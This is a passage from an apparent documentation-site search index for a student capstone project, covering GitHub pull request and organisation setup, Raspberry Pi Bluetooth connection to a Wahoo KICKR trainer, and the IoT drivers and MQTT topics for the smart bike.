project ‘gh pr create --project xyz-prjct’. To assign an individual as a reviewer ‘gh pr create --reviewer @Name’. To create the pull request in your default web browser ‘gh pr create --web’.  ","version":"Next","tagName":"h2"},{"title":"Pull requests using Codespaces​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#pull-requests-using-codespaces","content":" After committing changes to our local copy of the repository, we click on the create pull request icon.    We check that the local branch and repository we are merging from, and the remote branch and repository we are merging into, are correct. We then give the pull request a title and a description.    ","version":"Next","tagName":"h2"},{"title":"Pull request using Web Browsers​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#pull-request-using-web-browsers","content":" On the GitHub’s website, we navigate to the main repository page. We navigate to the branch menu where we choose our branch that contains the commits. We will see a yellow banner with ‘Compare &amp; pull request’ written, which we have to click to create a pull request for the associated branch. We use the base branch dropdown menu to select the branch we want to merge our changes into, and then we use the compare branch drop-down menu to choose the topic branch we made our changes in. We type a title and a description for our pull request. We then create the pull request that is ready for review, by clicking on Create Pull Request.  ","version":"Next","tagName":"h2"},{"title":"Pull requests using Desktop​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#pull-requests-using-desktop","content":" Navigate to the GitHub desktop and click on the preview pull request. The differences of the changes between the current and base branch will be shown. We then check if the branch mentioned in the ‘base’ section is the branch where we want to merge our changes. We will then click ‘Create Pull Request’. The desktop will open our default browser to take you us to GitHub. We then fill in our title and description for the pull request. We then create the pull request that is ready for review, by clicking on Create Pull Request.  ","version":"Next","tagName":"h2"},{"title":"Pull request from a fork​","type":1,"pageTitle":"Packaging Pull Requests","url":"/redback-documentation/docs/onboarding/github/pull-requests#pull-request-from-a-fork","content":" (For people with write access)  We first navigate to the original repository where the fork was created. We will see a yellow banner with ‘Compare &amp; pull request’ written, which we have to click to create a pull request for the associated branch. We then click on ‘compare across forks’. We then move on to base branch dropdown menu, where we select the branch of the upstream repository we want to merge our changes into. We then move on to the head fork dropdown menu, where we select our fork and use the compare branch drop-down menu to select the branch we made your changes in. We then fill in our title and description for the pull request. We then create the pull request that is ready for review, by clicking on Create Pull Request. ","version":"Next","tagName":"h2"},{"title":"Github Org Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/onboarding/github/github-org-guide","content":"","keywords":"","version":"Next"},{"title":"Rationale​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#rationale","content":" ","version":"Next","tagName":"h2"},{"title":"Benefits - why are we using an org?​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#benefits---why-are-we-using-an-org","content":" Using a GitHub Organisation allows us to:  Have multiple people create and manage repositories in a central location (not in personal accounts), allowing Redback to have separate repositories for each application or other codebase being developed without the tutor(s) managing the GitHub account having to do this or work being scattered across students’ personal accounts.Through having multiple repositories, keep code appropriately separated so that students only download what they want to work on to their machines (not huge repositories full of work they’ll never touch), and can just look at pull requests and issues for what they’re working on or are interested in.Easily archive repositories at the beginning or end of a trimester if work will not be continuing using that repository, making it clear which codebases are currently active and should be used.Maintain dependencies more easily because students can be confident that any changes will only affect their project, as well as not needlessly maintaining dependencies for sub-folders containing applications that aren’t being worked on anymore.Onboard students more easily because they are able to locate the purpose-built repository they want to work on and (quality documentation assumed) clone and run it with minimal guidance and no confusion about where the current and correct code is for their project and which instructions are relevant to them.  ","version":"Next","tagName":"h3"},{"title":"Guiding Principles​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#guiding-principles","content":" This rationale and the following guidelines are based on the principles of:  Ensuring our projects closely resemble how things are done in the industry.Enabling students to onboard as easily as possible.Empowering students to contribute and take ownership of their capstone project work.Facilitating easy handover and project continuity between trimesters.  ","version":"Next","tagName":"h3"},{"title":"Key Terms​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#key-terms","content":" Repository: A Git repository is a central location for storing, managing, and tracking changes in files and directories for code-based projects. In some contexts, you may hear or see ‘repository’ and ‘project’ used interchangeably because a single project may have a single repository for its code. If a repository contains the code for a web app, mobile app, data manipulation library, etc that is being developed by Redback, terms like ‘app’ or ‘library’ may also be interchangeable (e.g., ‘Go and clone the app from GitHub’).  Project: Redback Operations has a handful of projects running at any one time, and some projects may involve working on more than one repository. It is strongly encouraged to be mindful about when it is appropriate to create a new repository, striking a balance between: forking or branching from an existing one so that we don’t end up with needlessly divergent work and confusing amounts of repositories, and keeping codebases usefully siloed and not ending up with a single repository that tries to do to many things  Member: Students and tutors can be added as organisation members. It is important to note that members can create repositories within the organisation and by default are the administrators of the repositories they create.  Collaborator: Students can be added to individual repositories as collaborators. This enables them to be given appropriate permissions for the work they will be doing without the ability to create or manage repositories also being given by default.  Team: Each Redback project has a Team within the GitHub organisation that contains tutors, project leaders, and experienced students who will be managing repos, approving pull requests, etc. Teams can also be @ mentioned in issues, pull requests, and comments to notify those staff and students that their attention is required. Assigning repositories to a Team also simplifies managing repository permissions across trimesters – people only need to be added to or removed from a team to have access to that Team’s repositories granted or revoked. There is also a Tutors team that should be added to every new repository with admin permissions.  ","version":"Next","tagName":"h2"},{"title":"How-to, the short version: Repository health checklist​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#how-to-the-short-version-repository-health-checklist","content":" If you’re already familiar with GitHub and the org concepts outlined above, here’s the short version of the guidelines you should ensure your Redback repository follows.  If you are a leader taking on an existing repository, you should also check it at the start of the trimester to ensure these guidelines are followed.  More information about each setting is detailed in the ‘Long version’ section starting on the next page.  \tName\t✓ Clearly but concisely says what the repo is for ✓ Does not include information that could change in future trimesters1 ✓ Does not include trimester number or year1 Description\t✓ Is filled in with a concise description that enables new students to quickly understand which project(s), or part of a project, the repository is for Visibility\t✓ Private for cyber security projects ✓ Public for all others Licence\t✓ MIT for all open source (i.e., non-Cyber Security) projects2 Permissions\t✓ Tutors team has admin role ✓ Project team has write role ✓ Contributing students have write role Branch protection\t✓ Main branch cannot be directly pushed to ✓ Pull request approvals are required CODEOWNERS file\t✓ File exists in the root of the repository and designates the Tutors and project teams as the global code owners README file\t✓ Contains description of the project ✓ Contains prerequisites for running the code ✓ Contains clear instructions to enable students to independently set up and start working on the codebase  1To encourage continuity of projects across trimesters, generic non-time-specific names are encouraged. Using internal designations like ‘Project 4’ is also discouraged because the projects might be consolidated or split up in future trimesters. 2Unless there is a reason to use a different licence, such as a project dependency having licence terms that require the work using it to have another licence.  ","version":"Next","tagName":"h2"},{"title":"How-to, the long version: Creating a new repository or checking an existing one​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#how-to-the-long-version-creating-a-new-repository-or-checking-an-existing-one","content":" If you have an existing repository that you would like to check over or update, skip ahead to the ‘General Settings’ section below.  ","version":"Next","tagName":"h2"},{"title":"Prerequities​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#prerequities","content":" You have at least the Member role in the GitHub Org.Consensus has been reached within the Project team (at university level, not GitHub level) and with project leaders that a new repository is needed.A GitHub Team exists for the Redback Project this repository will be for.  ","version":"Next","tagName":"h3"},{"title":"Getting started​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#getting-started","content":" Go to the Repositories tab on the org page and click the ‘New Repository’ button.      Name and description: Choose a short but clear name that makes it obvious which project this repo is for and what code will be in it (for example, crowd-monitoring-web-app) and accompany it with a concise description.  tip Avoid using: Things that may change in future trimesters such as the capstone project number (e.g., ‘crowd-monitoring-web-app’ not ‘project-4’)The trimester or year, unless you have reason to believe your repository won’t be used beyond the current trimester.  Put yourself in the shoes of a new student onboarding into Redback for their first capstone trimester. Would you be able quickly tell that this is the repo you will be working on?  Visibility: For Cyber Security projects, choose Private. For all other projects, choose Public. Tick ‘Add a readme file’ and choose a gitignore template if you see fit. Choose a licence: All Redback projects except Cyber Security are open source, so our default licence is MIT.  tip Some third-party libraries have licence terms that may affect which licence you can use. For example, licence terms dictate that plugins developed for WordPress must be GPL-compatible.  Click ‘Create Repository’ in the bottom right. You will be taken to your new repo.  ","version":"Next","tagName":"h3"},{"title":"General Settings​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#general-settings","content":" Click the 'Settings' tab.      Untick any features you don’t intend to use, such as Wikis. You can always turn them back on later if needed, but it can be good to keep things simple at first Pull request settings: Choose the settings your team prefers here. Don’t worry, you can always change these later if you find what you choose now doesn’t work for your team.  tip Squash merging: can be a good default choice because if someone has many commits to their pull request (which is very common), ‘squash and merge’ commits them all to the main branch in one clean commit. This can be much easier for people navigating the commit history as well as making it far easier to revert a change if necessary than if a merge creates multiple commits.Turning on ‘Always suggest updating pull request branches’ can be helpful for ensuring students keep their PR branches up-to-date with the main branch and resolve any conflicts incrementally as they go, rather than ending up withn a lot of conflicts to resolve because the main branch as diverged far from theirs.Turning on ‘Allow auto-merge’ can be helpful as it means you don’t have to wait for students to manually merge their PR once it’s approved, improving efficiency.  Settings in this screen are autosaved.  ","version":"Next","tagName":"h3"},{"title":"Collaborators and teams​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#collaborators-and-teams","content":" Still in the Settings area, click ‘Collaborators and Teams’ in the sidebar. Next to ‘Manage access’, click ‘Add teams.’ Search for and select the Tutors team and the other relevant project team(s). In the list, update the Tutors group role to ‘Admin’ and the project team’s to Write.      This is also where you individually add other students who will be working on the project, as Collaborators. They will need the Write permission so they can create branches.  tip Ensure branch protection rules are in place (instructions below) before adding students with Write permission, to ensure they can’t write directly to the main branch.  ","version":"Next","tagName":"h3"},{"title":"Branch Protection Rules and Code Owners​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#branch-protection-rules-and-code-owners","content":" In the sidebar, click ‘Branches’ and then the ‘Add branch protection rule’ button.      In the ‘branch name pattern’ field, enter ‘main’ (or the name of your primary branch if different). Tick ‘Require a pull request before merging’ and ‘require approvals’ followed by the settings appropriate for your project.  tip ‘Dismiss stale pull request approvals when new commits are pushed’ is highly recommended. This prevents anyone from adding new code after a PR is approved, and merging that new code without it being re-reviewed. Enabling ‘Require review from code owners’ is kindly requested by the Redback mentor/tutor team. This is simply to ensure a pair of experienced eyes looks at each pull request to catch mistakes such as committing credentials, node_modules folders, Python precompile files, MacOS .DS_Store files, etc.  If you turned on ‘require review from code owners’, you now need to specify who those owners are through a CODEOWNERS file. Navigate to the main page of your repository and click ‘add file.’      Name the file CODEOWNERS and add global owners using the * symbol and @team-name. For example:      When done, click ‘commit changes’ in the top right and follow the prompts. If you have any errors such as a misspelled team name or incorrect permissions for that team, an alert will be displayed.  ","version":"Next","tagName":"h3"},{"title":"Readme File​","type":1,"pageTitle":"Github Org Guide","url":"/redback-documentation/docs/onboarding/github/github-org-guide#readme-file","content":" Either through the GitHub web interface or after cloning the repo to your machine, enter more information in the README file: A clear description of what this repository is for. It should be concise, but this is the place to provide a bit more detail than the brief description entered when you created the repo. Instructions on how to set up the repo and start working with it. Include prerequisites (e.g., for a JavaScript project, having Node installed) and step-by-step instructions that ensure the majority of students will be able to independently set up and run the project locally.  You may not have all this information ready yet for a new repository that doesn’t contain any code yet, so simply ensure you return to this step when you do. ","version":"Next","tagName":"h3"},{"title":"How to fix Bluetooth Connectivity for Raspberry Pi with Wahoo device connection?","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLEConnectivityFix","content":"Last updated by: Kaleb, Last updated on: '20/09/2024' Last updated by: Kaleb, Last updated on: '20/09/2024' Important! This PDF document is old and some of its contents may be wrong. You should not need to use this and instead rely on the newer ble_auto_connect.sh script. How to fix Bluetooth Connectivity for Raspberry Pi with Wahoo device connection? Due to the volatility of BLE connection, while running the script to have the Raspberry Pi send data to the cloud, you might have encountered the following message: [MAC ADDRESS] Connected [MAC ADDRESS] Disconnected While research is being done to move to a serial connection, I have created a way through which the Wahoo device will stay connected to the Raspberry after which the script can be ran for testing and showcases. Here are the steps to follow: Open a terminal in the Raspberry Pi. Ensure the Pi’s Bluetooth is switched on. Type ‘sudo bluetoothctl’. It has already been installed in Bike 1’s Raspberry Pi. Type in ‘agent on’, then ‘default-agent’ to enable device scanning and connections. As the device is already connected, you can type connect [MAC ADDRESS OF DEVICE]*. In case of the device being unpaired with the Pi, type in ‘pair [MAC ADDRESS OF DEVICE]*. Run your script and the Bluetooth connectivity will stay on throughout the script being ran. *Check the constants.py file in the lib file from the redback-smartbike-iot repository.","keywords":"","version":"Next"},{"title":"BLE Auto Connecting Script","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script","content":"","keywords":"","version":"Next"},{"title":"Starting the Script​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#starting-the-script","content":" To start this script run the following command from the home directory:  bash iot/scripts/ble-auto-connect/ble_auto_connect.sh  ","version":"Next","tagName":"h2"},{"title":"Script Requirements​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#script-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"Expect Installed​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#expect-installed","content":" Ensure expect is installed using:  sudo apt-get install expect  ","version":"Next","tagName":"h3"},{"title":"KICKR MAC Address​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#kickr-mac-address","content":" The KICKR's MAC address must be accurately stored in the hidden .env file, in the home directory, with the following format:  ... KICKR_MAC_ADDRESS=&quot;XX:XX:XX:XX:XX:XX&quot; ...  To access the hidden environment file use nano .env in the home directory  ","version":"Next","tagName":"h3"},{"title":"Bike NOT on Standby​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#bike-not-on-standby","content":" Ensure that the bike is not on standby: the BLE indicator light on the KICKR is blinking blue and not off    KICKR BLE indicator light located above ANT+ indicator light  If it is on standby rotate the pedals a few times.  ","version":"Next","tagName":"h3"},{"title":"Expected Process Behaviour​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#expected-process-behaviour","content":" The script follows a simple flow of commands reacting to expected outputs to terminal from bluetoothctl commands and writing input commands into the terminal.  ","version":"Next","tagName":"h2"},{"title":"Once Started​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#once-started","content":" Once the script has been started, it enters commands into the terminal interface like a user, waiting for expected output from commands and responding to resolve any issues.  Agent registered [bluetooth]# default-agent Default agent request successful [bluetooth]# connect d9:07:e8:1c:db:94 Attempting to connect to d9:07:e8:1c:db:94 [CHG] Device D9:07:E8:1C:DB:94 Connected: yes Failed to connect: org.bluez.Error.Failed [CHG] Device D9:07:E8:1C:DB:94 Connected: no [bluetooth]# connect d9:07:e8:1c:db:94 Attempting to connect to d9:07:e8:1c:db:94 [CHG] Device D9:07:E8:1C:DB:94 Connected: yes Connection successful [Wahoo KICKR 58CB]# exit   DO NOT attempt to enter anything into command-line during this process - if you must, terminate the script using Ctrl + C before doing so.  ","version":"Next","tagName":"h3"},{"title":"BLE Scanning​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#ble-scanning","content":" [CHG] Controller B8:27:EB:DB:48:17 Discovering: yes [NEW] Device CB:81:82:06:8A:F8 HEADWIND AF28 [NEW] Device E4:8F:3B:BB:66:82 E4-8F-3B-BB-66-82 [NEW] Device F2:93:DE:57:0C:2C F2-93-DE-57-0C-2C [CHG] Device D9:07:E8:1C:DB:94 RSSI: -45 [CHG] Device D9:07:E8:1C:DB:94 UUIDs: 00001818-0000-1000-8000-00805f9b34fb [CHG] Device D9:07:E8:1C:DB:94 UUIDs: 00001826-0000-1000-8000-00805f9b34fb [NEW] Device C1:44:45:FD:29:12 C1-44-45-FD-29-12 [NEW] Device 47:0B:B1:7F:C4:E6 47-0B-B1-7F-C4-E6 [NEW] Device D7:C1:4A:AF:BF:C1 D7-C1-4A-AF-BF-C1   If the KICKR has not been registered by bluetoothctl then the script will automatically initiate a scan for all local BLE devices yielding a spam of output like above. This output should only last a few seconds at most a minute.  ","version":"Next","tagName":"h3"},{"title":"Script Completion​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#script-completion","content":" If a connection was successfully achieved, an output to the terminal should indicate so:  Connection established with bike via BLE   And the BLE indicator light on the KICKR should become solid:    ","version":"Next","tagName":"h3"},{"title":"Script Failure​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#script-failure","content":" The above process should only take a few seconds to a minute but can fail for unknown reasons and enter into a loop. If this happens, use Ctrl + C to terminate the script and then restart both the bike &amp; Pi, and re-run the script.  If this does not fix the issue then refer to the BLEConnectivityFix document to connect manually.  ","version":"Next","tagName":"h3"},{"title":"Future​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#future","content":" Some improvements to the script are desireable and left for future team members to implement:  Running the script on Pi start up using a daemon to fully automate the connectionRunning the script on script start up (start_all.sh) so that BLE connection is always resolved before other processes initialiseRunning the script in a background process so that it does not interfer with the command-lineForever looping the script so that it will reconnect if the connection drops for some reasonExtend script to handle any future encountered issuesChange the regex pattern used to match the KICKR MAC address to be more forgiving  ","version":"Next","tagName":"h2"},{"title":"Resources​","type":1,"pageTitle":"BLE Auto Connecting Script","url":"/redback-documentation/docs/project-1/iot/ble-connectivity/BLE-Auto-Connect-Script#resources","content":" bluetoothctl - https://manpages.debian.org/unstable/bluez/bluetoothctl.1.en.htmlexpect introduction - https://phoenixnap.com/kb/linux-expectReading files using tcl (the backbone of expect) - https://wiki.tcl-lang.org/page/How+do+I+read+and+write+files+in+TclBash script &amp; expect script located in scripts/ble-auto-connect/ ","version":"Next","tagName":"h2"},{"title":"Cadence Sensor","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Cadence-sensor","content":"Last updated by: KasparByrne, Last updated on: '25/09/2024' Last updated by: KasparByrne, Last updated on: '25/09/2024' Cadence Sensor Important! The Wahoo Cadence Sensor is redundant as the KICKR smart trainer has equivalent native functionality. The cadence_sensor driver code is similar to other drivers and is redundant hence it is undocumented. To see the driver code: Drivers/cadence_sensor/cadence.py","keywords":"","version":"Next"},{"title":"Button Control","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Button-Control","content":"","keywords":"","version":"Next"},{"title":"Button class​","type":1,"pageTitle":"Button Control","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Button-Control#button-class","content":" The Button class can be used to quickly create new buttons which will read input from a passed pin and publish when the pin is pressed or released. The class functions based on events from the GPIO board.  Parameter\tType\tDescriptionpin\tint\tThe GPIO pin the button is connected to name\tstr\tAn identifying name used in logging and to identify in the publishing payload client\tMQTTClient\tthe standardised MQTT client  ","version":"Next","tagName":"h2"},{"title":"MQTT Topics​","type":1,"pageTitle":"Button Control","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Button-Control#mqtt-topics","content":" The default MQTT topic used in this driver is:  bike/{DEVICE_ID}/button/report  All button presses and releases will be published to this topic.  ","version":"Next","tagName":"h2"},{"title":"MQTT Payload​","type":1,"pageTitle":"Button Control","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Button-Control#mqtt-payload","content":" The published payload on each press and release uses this a JSON structure:  { 'button' : [button name] 'state' : [1 for pressed] | [0 for released] 'timestamp' : [time of publish] }   ","version":"Next","tagName":"h2"},{"title":"Driver Location​","type":1,"pageTitle":"Button Control","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Button-Control#driver-location","content":" To see the button_control driver code:  Drivers/button_control/button_control.py ","version":"Next","tagName":"h2"},{"title":"Codebase Overview","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview","content":"","keywords":"","version":"Next"},{"title":"Dependencies​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#dependencies","content":" Several dependencies are used by the drivers:  paho-mqtt is used for MQTT functionalitygatt library is used for GATT functionality  Drivers/lib/ directory contains our in-house library/common code - including:  constants.py for constants used across drivers such as MQTT example topics, upper and lower bounds for valid value ranges, etc.mqtt_client.py which contains our standard mqtt client which should be used by all drivers.ble_helper.py which is used by drivers to match UUIDs of characteristics &amp; services and convert values to their OP codes.gatt/ directory which contains the gatt_linux.py updated gatt library used by some drivers.  Both the in-house and external dependencies help to standardise and streamline code.  ","version":"Next","tagName":"h2"},{"title":"scripts​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#scripts","content":" The scripts directory holds our bash scripts for running driver code.  The start_all.sh script is the primary Smartbike process script which starts all relevant drivers.  ","version":"Next","tagName":"h2"},{"title":"ble-auto-connect​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#ble-auto-connect","content":" ble-auto-connect/ sub-directory contains the ble_auto_connect script: it is made up of a bash script and expect script. To find out more about the ble_auto_connect script see the documentation.  ","version":"Next","tagName":"h3"},{"title":"Drivers​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#drivers","content":" Drivers drive the functionality of the Smartbike. They connect, control and read values from a specific Smartbike component. Multiple drivers are used to drive the whole Smartbike.  ","version":"Next","tagName":"h2"},{"title":"button_control​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#button_control","content":" button_control.py drives the turning button code and any other buttons.  ","version":"Next","tagName":"h3"},{"title":"kickr_climb_and_smart_trainer​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#kickr_climb_and_smart_trainer","content":" wahoo_device.py drives the KICKR Climb's incline control and KICKR smart trainer's resistance control. It also reads the speed, cadence and power values from the KICKR smart trainer.  incline_and_resistance_control.py is the starter for the wahoo_device.py driver. It takes arguments from the starting script and reads loaded environment variable values.  ","version":"Next","tagName":"h3"},{"title":"fan​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#fan","content":" fan.py drives the Wahoo Headwind Blueooth Fan, connecting to and controlling the fan's blowing force.  ","version":"Next","tagName":"h3"},{"title":"heart_rate_sensor​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#heart_rate_sensor","content":" heartrate.py drives the TICKR heart rate monitor, connecting to and read &amp; publishing the heart rate data from the TICKR.  ","version":"Next","tagName":"h3"},{"title":"Archive​","type":1,"pageTitle":"Codebase Overview","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/Codebase-Overview#archive","content":" The Archive directory holds old and retired code. This includes retired drivers (mostly predefined workout &quot;routines&quot; for the Smartbike), code for remotely connecting to and controlling the Raspberry Pi, a very different and old version of the VR game. It also holds old documentation and research. ","version":"Next","tagName":"h2"},{"title":"Heart Rate Sensor","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Heart-rate-sensor","content":"","keywords":"","version":"Next"},{"title":"GATT Device​","type":1,"pageTitle":"Heart Rate Sensor","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Heart-rate-sensor#gatt-device","content":" The driver is primarily driven by a gatt.Device object which connects and reads data from the TICKR heart rate monitor through its characteristics.  Service/Characteristic\tUUID\tPurposeheart_rate_service\tending-180d\tHolds the heart_rate_measurement_characteristic characteristic heart_rate_measurement_characteristic\tending-2a37\tReadable characteristic which holds the measured heart rate data  UUIDs can be matched to their characteristic/service using the following two Bluetooth SIG documents:  Assigned NumbersFitness Machine Service 1.0  ","version":"Next","tagName":"h2"},{"title":"Extracting Heart Rate Data​","type":1,"pageTitle":"Heart Rate Sensor","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Heart-rate-sensor#extracting-heart-rate-data","content":" Notification is enabled for the heart_rate_measurement_characteristic characteristic and so when it updates the characteristic_value_updated method is called with the new heart rate data.  The heart rate data is stored in a series of bytes with a preceding flag byte to indicate the format of the data and what data is present.  Flags  Bit Position\tMeaning0\tset if the heart rate is 16 bit (otherwise 8 bit) 1\tset if contact is detected (only valid if bit 2 is also set) 2\tset if contact status is reported 3\tset if energy expenditure is reported 4\tset if rr interval is reported 5-7\treserved for future use (ignored)  Measurements  Heart rate (beats per minute) [uint8, or uint16 if flags Bit 0 is set]Energy (kJ) [uint16, only present if flags Bit 3 is set]RR Interval (1/1024 seconds) [Remaining bytes until end of packet, only present if flags bit 4 is set]  ","version":"Next","tagName":"h2"},{"title":"MQTT Topics​","type":1,"pageTitle":"Heart Rate Sensor","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Heart-rate-sensor#mqtt-topics","content":" Heart rate data is published to the following topic:  bike/{DEVICE_ID}/heartrate  This should be changed to conform to the MQTT Topics documents convention:  bike/{DEVICE_ID}/heartrate/report  ","version":"Next","tagName":"h2"},{"title":"Driver Location​","type":1,"pageTitle":"Heart Rate Sensor","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Heart-rate-sensor#driver-location","content":" Drivers/heart_rate_sensor/heartrate.py ","version":"Next","tagName":"h2"},{"title":"Fan Driver","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Fan","content":"","keywords":"","version":"Next"},{"title":"GATT Device​","type":1,"pageTitle":"Fan Driver","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Fan#gatt-device","content":" The driver is primarily driven by a gatt.Device object which connects to the Fan and then writes to the relevant characteristics.  Service/Characteristic\tUUID\tPurposeenable_service\tending-ee01\tHolds the enable_characteristic enable_characteristic\tending-e002\tLikely the FTMS control point of the Headwind Fan - an array of bytes is written to it with a comment indicating that it is to request writing permissions fan_service\tending-ee0c\tHolds the fan_characteristic fan_characteristic\tending-e038\tLikely the custom fan control point - two arrays of bytes are written to it with comments indicating that they are to turn the fan on and to write a new blowing force  UUIDs can be matched to their characteristic/service using the following two Bluetooth SIG documents:  Assigned NumbersFitness Machine Service 1.0  No proper flow control is implemented instead values are rewritten multiple times with the hope that they will be successfully written.  ","version":"Next","tagName":"h2"},{"title":"MQTT Topics​","type":1,"pageTitle":"Fan Driver","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Fan#mqtt-topics","content":" The implemented MQTT topic is the KICKR smart trainer's speed publishing topic:  bike/{DEVICE_ID}/speed  This should be changed to conform to the MQTT Topics documents convention:  bike/{DEVICE_ID}/fan/control  ","version":"Next","tagName":"h2"},{"title":"Speed Value Binning​","type":1,"pageTitle":"Fan Driver","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Fan#speed-value-binning","content":" The blow force of the Headwind Fan is a percentage between 0 and 100.  The current fan driver implementation bins speed values into 6 bins.  Bin Range\tBlow Force0\t0% 0 - 4\t20% 4 - 8\t40% 8 - 12\t60% 12 - 16\t80% &gt;16\t100%  Important! It is better to let application developers decide how they want the fan's power to be controlled. Forcing a relationship between speed and fan force, in addition to forcing a set number of steps in blow force, is bad.  ","version":"Next","tagName":"h2"},{"title":"Driver Location​","type":1,"pageTitle":"Fan Driver","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Fan#driver-location","content":" Drivers/fan/fan.py ","version":"Next","tagName":"h2"},{"title":"KICKR Climb & Smart Trainer","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer","content":"","keywords":"","version":"Next"},{"title":"Data Reading​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#data-reading","content":" Data reading is achieved by enabling notification on the indoor_bike_data characteristic with UUID (INDOOR_BIKE_DATA_UUID). Once notification is enabled, when the characteristic updates the characteristic_value_updated method is called with the new value and the process_indoor_bike_data method is called to process the new data.  The data processing is complex and the linked Bluetooth SIG documents should be investigated to understand how it works.  ","version":"Next","tagName":"h2"},{"title":"Incline Control​","type":1,"pageTitle":"KICKR Climb & Smart Trainer","url":"/redback-documentation/docs/project-1/iot/codebase-documentation/drivers/Kickr-climb-&-smart-trainer#incline-control","content":" As a quick note: the incline control does not follow the standards defined by Bluetooth SIG.  A new incline value can be set by writing to the custom_incline_characteristic characteristic - UUID.  The value must be between -10 and 19, and converted to a byte array using the convert_incline_to_op_value BLE helper function. The value must also be paired with the INCLINE_CONTROL_OP_CODE OP code.  The custom_control_point_set_target_inclination method can be passed the integer value to set the new incline.  ","version":"Next","tagName":"h2"},{"title":"Resistance Control​","type":1,"pageTitle":"KICKR Climb & Smart 